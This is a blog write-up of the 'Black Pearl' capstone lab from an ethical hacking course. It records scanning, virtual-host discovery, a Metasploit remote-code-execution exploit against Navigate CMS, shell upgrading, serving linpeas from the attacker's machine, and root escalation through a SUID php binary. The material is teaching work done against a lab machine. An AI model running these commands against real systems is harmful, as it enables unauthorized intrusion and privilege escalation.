---
title: Black Pearl
publishDate: 2023-02-19 00:00:00
img: "https://res.cloudinary.com/drup8mw79/image/upload/v1676852363/darthassan/posts/urvan-taillebuis-blackpearl-03_etysfo.jpg"
img_alt: The black pearl pirate ship
description: |
  The Black Pearl is a capstone project for TCM's Practical Ethical Hacking course.
tags:
  - PEH
  - Metasploit
  - Previlege Excalation
---

### Nmap scan

```zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directory Busting with ffuf

```zsh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.82.145/FUZZ
```

### DNS recon

```zsh
┌──(kali㉿kali)-[~]
└─$ dnsrecon -r 127.0.0.0/24 -n 192.168.82.145 -d i
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found


┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts

```

##### Directory Busting with ffuf

###### http://blackpearl.tcm

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
```

#### Metasploit

```
msf > use exploit/multi/http/navigate_cms_rce
msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 192.168.82.145
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > exploit
```

- _Get tty_
  `python -c 'import pty; pty.spawn("/bin/bash")'`

#### Previlege Excalation

- Linpeas

```
┌──(kali㉿kali)-[~/transfers]
└─$ ls
linpeas.sh  pspy64  winpeas.exe  Wise.exe

┌──(kali㉿kali)-[~/transfers]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.82.145 - - [07/Sep/2022 00:57:49] "GET /linpeas.sh HTTP/1.1" 200 -

```

- Exploiting suid and sgid using [gtfobins](https://gtfobins.github.io/gtfobins/php/) for php vulnerability
  `/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"`

``
